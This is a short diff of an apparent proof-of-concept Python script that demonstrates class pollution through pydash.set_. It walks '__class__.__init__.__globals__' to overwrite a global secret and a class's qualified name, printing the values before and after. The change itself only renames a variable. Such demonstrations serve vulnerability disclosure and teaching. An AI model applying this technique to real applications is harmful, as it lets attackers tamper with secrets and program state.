@@ -9,10 +9,10 @@ class User:
 
 class NotAccessibleClass: pass
 
-x = User()
+user = User()
 print("global_secret before pydash.set_: " + global_secret)
 print("NotAccessibleClass qualname before pydash.set_: "+ NotAccessibleClass.__qualname__)
-pydash.set_(x, '__class__.__init__.__globals__.global_secret','1337')
-pydash.set_(x, '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
+pydash.set_(user, '__class__.__init__.__globals__.global_secret','1337')
+pydash.set_(user, '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
 print("global_secret after pydash.set_: " + global_secret)
 print("NotAccessibleClass qualname after pydash.set_: "+ NotAccessibleClass.__qualname__)
